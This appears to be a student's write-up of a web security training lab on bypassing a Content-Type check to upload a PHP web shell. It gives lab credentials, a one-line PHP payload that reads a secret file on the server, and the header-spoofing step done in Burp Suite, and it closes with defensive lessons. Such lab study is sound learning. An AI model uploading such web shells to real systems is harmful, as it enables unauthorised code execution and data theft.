# Lab:Web Shell upload via Content-Type Restriction bypass 

##  Objective
Explore an insecure file upload vulnerability to achieve remote code execution by uploading a php web shell and retrive sensitive data from the server (/home/carlos/secret) 

##  Vulnerability
The application is vurnerable to unrestricted file upload,as it fails to validate file types and content.This allows attackers to upload and execute files(eg.a PHP web shell),leading to remote code execution.

##  Steps
Log in using the provided credentials(wiener:peter),
Navigate to the image upload functionality,
Create a simple php file without any restrictions,
Access the uploaded file via the browswer to execute commands,
Use the web shell to read /home/carls/secret.
Sunmit the retrived secret to compare the lab.

##  Exploit

PHP Web Shell Payload: <?php echo file_get_contents('/home/carlos/secret'); ?>

Bypass Technique: Modified the Content-Type header from application/x-php to image/jpeg using Burp Suite.  The server trusted this user-controlled header and allowed the PHP file upload.

Content-Type: image/jpeg

--

##Payload used
<?php echo file_get_contents('/home/carlos/secret'); ?>

##  Proof (optional)
![WhatsApp Image 2026-04-10 at 21 07 53](https://github.com/user-attachments/assets/567af872-a3f4-4562-aca2-20fc5d807452)
![WhatsApp Image 2026-04-10 at 21 07 54](https://github.com/user-attachments/assets/9b017dab-767e-4ea3-a209-8868d36d6f4a)

![WhatsApp Image 2026-04-10 at 21 07 54(1)](https://github.com/user-attachments/assets/5178632e-c667-46c4-ac78-eee77bbea6d2)

![WhatsApp Image 2026-04-10 at 21 07 54(2)](https://github.com/user-attachments/assets/5ffae969-321c-4a20-9d83-0703c75531de)

![WhatsApp Image 2026-04-10 at 21 07 54(3)](https://github.com/user-attachments/assets/a1661b8c-7860-4b2a-80b0-6b22a9885e1d)

![WhatsApp Image 2026-04-10 at 21 07 54(4)](https://github.com/user-attachments/assets/a9902b05-c17f-449a-ab32-fe4dc8344930)

![WhatsApp Image 2026-04-10 at 21 07 54(5)](https://github.com/user-attachments/assets/d2804900-24e7-4c73-9165-1c267f215fb7)


## Lesson Learned
Never trust client-controlled headers like Content-Type
File upload validation must be done server-side
Improper validation can lead to Remote Code Execution (RCE)
Always test multiple bypass techniques (Content-Type, extension, magic bytes, etc.)
File upload vulnerabilities are highly critical in real-world applications

